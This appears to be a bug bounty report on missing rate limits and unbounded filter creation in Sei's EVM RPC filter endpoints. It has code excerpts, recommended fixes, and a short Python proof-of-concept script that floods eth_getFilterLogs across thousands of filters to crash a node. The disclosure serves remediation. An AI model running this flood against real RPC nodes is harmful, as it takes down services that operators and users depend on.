### Title
Missing Rate Limiting on `eth_getFilterLogs` / `eth_getFilterChanges` and Unbounded Filter Creation Enables RPC DoS - (`evmrpc/filter.go`)

---

### Summary

The `eth_getFilterLogs` and `eth_getFilterChanges` endpoints in Sei's EVM RPC layer bypass the `globalRPSLimiter` that protects `eth_getLogs`. Additionally, `eth_newFilter` and `eth_newBlockFilter` impose no cap on the number of filters a client can create. An unprivileged attacker can combine these gaps to exhaust CPU, I/O, and memory on any Sei EVM RPC node, crashing it without any authentication.

---

### Finding Description

**Gap 1 — `GetFilterLogs` and `GetFilterChanges` bypass rate limiting**

`GetLogs` applies a `globalRPSLimiter` (30 RPS), but only for queries exceeding `RPSLimitThreshold` (100 blocks): [1](#0-0) 

`GetFilterLogs` and `GetFilterChanges` call `a.logFetcher.GetLogsByFilters` directly, with no rate-limiting guard at all: [2](#0-1) [3](#0-2) 

`GetLogsByFilters` in `LogFetcher` enforces a block-range cap (`maxBlock`, default 2000) but has no rate limiter: [4](#0-3) 

**Gap 2 — Unbounded filter creation**

`NewFilter` and `NewBlockFilter` add entries to `a.filters` (a plain `map[ethrpc.ID]filter`) with no size check: [5](#0-4) [6](#0-5) 

The cleanup loop only evicts filters whose `lastAccess` exceeds the configured timeout: [7](#0-6) 

`GetFilterLogs` calls `updateFilterAccess` before every query, resetting the expiry clock: [8](#0-7) 

So an attacker who periodically polls each filter keeps all of them alive indefinitely.

---

### Impact Explanation

An unprivileged attacker can:

1. Create thousands of filters via `eth_newFilter` (no cap → unbounded memory growth in `a.filters`).
2. Flood `eth_getFilterLogs` on each filter — no rate limiter, each call scans up to 2000 blocks, spawning parallel worker-pool tasks.
3. Exhaust CPU, I/O (DB semaphore), and memory on the RPC node, causing it to crash or become unresponsive.

This maps to **Medium** per the Sei bounty scope: *unauthorized RPC/gRPC crash*.

---

### Likelihood Explanation

The attack requires no credentials, no on-chain funds, and no special knowledge — only the ability to send JSON-RPC requests to a public endpoint. The `eth_newFilter` → `eth_getFilterLogs` flow is standard Ethereum tooling. Exploitation is trivial and scriptable.

---

### Recommendation

1. **Cap filter count per connection / globally**: Reject `eth_newFilter` / `eth_newBlockFilter` once `len(a.filters)` exceeds a configurable maximum (e.g., 1000).
2. **Apply `globalRPSLimiter` to `GetFilterLogs` and `GetFilterChanges`**: Add the same `a.globalRPSLimiter.Allow()` guard used in `GetLogs` before calling `GetLogsByFilters`.
3. **Remove the `RPSLimitThreshold` bypass in `GetLogs`**: All block-range queries, not just those > 100 blocks, should be subject to rate limiting.

---

### Proof of Concept

```python
import requests, threading

RPC = "http://<sei-rpc-node>:8545"

def jsonrpc(method, params):
    return requests.post(RPC, json={"jsonrpc":"2.0","id":1,"method":method,"params":params}).json()

# Step 1: create thousands of filters (no server-side cap)
filter_ids = []
for _ in range(5000):
    r = jsonrpc("eth_newFilter", [{"fromBlock": "0x1"}])
    filter_ids.append(r["result"])

# Step 2: flood eth_getFilterLogs on all filters concurrently (no rate limit)
def spam(fid):
    while True:
        jsonrpc("eth_getFilterLogs", [fid])

threads = [threading.Thread(target=spam, args=(fid,), daemon=True) for fid in filter_ids]
for t in threads:
    t.start()
# Node CPU/IO/memory exhausted → RPC unresponsive / crash
```

func (a *FilterAPI) cleanupExpiredFilters(timeout time.Duration) {
	now := time.Now()
	toRemove := make([]ethrpc.ID, 0)

	// First pass: identify expired filters (read lock)
	a.filtersMu.RLock()
	for id, filter := range a.filters {
		if now.Sub(filter.lastAccess) > timeout {
			toRemove = append(toRemove, id)
		}
	}
	a.filtersMu.RUnlock()

	// Second pass: remove expired filters (write lock)
	if len(toRemove) > 0 {
		a.filtersMu.Lock()
		for _, id := range toRemove {
			if filter, exists := a.filters[id]; exists {
				delete(a.filters, id)
				if filter.cancelFunc != nil {
					filter.cancelFunc()
				}
			}
		}
		a.filtersMu.Unlock()
	}
}

func (a *FilterAPI) GetFilterLogs(
	ctx context.Context,
	filterID ethrpc.ID,
) (res []*ethtypes.Log, err error) {
	startTime := time.Now()
	defer func() {
		recordMetricsWithError(ctx, fmt.Sprintf("%s_getFilterLogs", a.namespace), a.connectionType, startTime, err, recover())
	}()

	// Read filter with read lock
	a.filtersMu.RLock()
	filter, ok := a.filters[filterID]
	a.filtersMu.RUnlock()

	if !ok {
		return nil, errors.New("filter does not exist")
	}

	// Update access time
	a.updateFilterAccess(filterID)

	logs, lastToHeight, err := a.logFetcher.GetLogsByFilters(ctx, filter.fc, 0)
	if err != nil {
		return nil, err
	}
	if logs == nil {
		logs = []*ethtypes.Log{}
	}

	// Update filter with write lock
	a.filtersMu.Lock()
	if updatedFilter, exists := a.filters[filterID]; exists {
		updatedFilter.lastToHeight = lastToHeight
		a.filters[filterID] = updatedFilter
	}
	a.filtersMu.Unlock()

	return logs, nil
